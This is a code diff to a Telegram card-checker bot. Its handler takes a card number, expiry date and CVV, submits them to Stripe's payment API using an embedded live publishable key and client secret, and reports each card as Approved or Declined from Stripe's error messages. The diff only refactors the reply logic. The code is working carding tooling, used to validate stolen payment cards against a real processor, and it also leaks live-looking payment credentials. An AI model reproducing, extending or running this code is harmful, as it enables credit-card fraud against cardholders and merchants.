@@ -224,7 +224,6 @@ async def pene(message: types.Message):
     mes = spli[1]
     ano = spli[2]
     cvv = spli[3]
-    m1 = await contra.edit_text(f"<b>💳𝓒𝓒: {ccs}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ʟᴀ ᴄᴄ ʙʙ: [🔴]</b>")
 
     dat4 = f'receipt_email=djfjdjffj%40gmail.com&payment_method_data[type]=card&payment_method_data[billing_details][email]=djfjdjffj%40gmail.com&payment_method_data[billing_details][name]=dd&payment_method_data[billing_details][address][postal_code]=10081&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=e97f7c39-c716-4d6f-9bcf-567d84a828419950f7&payment_method_data[muid]=a2e62b85-15c5-4dd1-be12-03b1db1a2396be9b77&payment_method_data[sid]=0c3ac9c2-17e9-43a0-9bba-cb1174e25c5e83d67d&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fed398fe5b%3B+stripe-js-v3%2Fed398fe5b&payment_method_data[time_on_page]=499164&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_DzYuDiszHWOjwN44sVfaT41s&client_secret=pi_3MbaLOJeGhFfMJgC1jwsOBWM_secret_pLuyaWQpQqSY8B7mabt9q0mTY'
 
@@ -271,14 +270,10 @@ async def pene(message: types.Message):
     country=country1['name']
 
     final = time.perf_counter()
- 
-    m2 = await m1.edit_text(f"<b>💳𝓒𝓒: {ccs}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ʟᴀ ᴄᴄ ʙʙ: [🔴][🟡]</b>")
-    m3 = await m2.edit_text(f"<b>💳𝓒𝓒: {ccs}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ʟᴀ ᴄᴄ ʙʙ: [🔴][🟡][🟢]</b>")
-    time.sleep(1)
 
 
-    if "Your card was declined." in msgg:
-        await message.reply(f"""
+    if 'Your card was declined.' in msgg:
+        return await message.reply(f'''
 <b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
 [🝂] 𝐂𝐂: <code>{ccs}</code> 
 [🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
@@ -290,11 +285,11 @@ async def pene(message: types.Message):
 —————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
 [Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
 [Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
+[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
 
 
-    elif "Your card's security code is invalid." in msgg:
-          await message.reply(f"""
+    if 'Your card's security code is invalid.' in msgg:
+        return await message.reply(f'''
 <b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
 [🝂] 𝐂𝐂: <code>{ccs}</code> 
 [🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
@@ -306,11 +301,11 @@ async def pene(message: types.Message):
 —————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
 [Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
 [Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
+[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
           
       
-    elif "Your card's expiration year is invalid." in msgg:
-          await message.reply(f"""
+    if 'Your card's expiration year is invalid.' in msgg:
+        return await message.reply(f'''
 <b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
 [🝂] 𝐂𝐂: <code>{ccs}</code> 
 [🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
@@ -322,10 +317,10 @@ async def pene(message: types.Message):
 —————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
 [Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
 [Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
+[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
 
-    elif "Your card number is incorrect." in msgg:
-          await message.reply(f"""
+    if 'Your card number is incorrect.' in msgg:
+        return await message.reply(f'''
 <b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
 [🝂] 𝐂𝐂: <code>{ccs}</code> 
 [🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
@@ -337,10 +332,10 @@ async def pene(message: types.Message):
 —————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
 [Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
 [Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
+[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
 
-    elif "Your card has insufficient funds." in msgg:
-          await message.reply(f"""
+    if 'Your card has insufficient funds.' in msgg:
+        return await message.reply(f'''
 <b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
 [🝂] 𝐂𝐂: <code>{ccs}</code> 
 [🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
@@ -352,10 +347,10 @@ async def pene(message: types.Message):
 —————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
 [Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
 [Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
+[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
 
     else:
-        await message.reply(f"""
+        return await message.reply(f'''
 <b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ 25$ </b>
 [🝂] 𝐂𝐂: <code>{ccs}</code> 
 [🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
@@ -367,7 +362,7 @@ async def pene(message: types.Message):
 —————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
 [Ϟ] 𝐓𝐢𝐦𝐞:  </code>{final-ini:0.2} (segundos)</code>
 [Ϟ] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
-[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
+[Ϟ] 𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk ''')
         
    
         
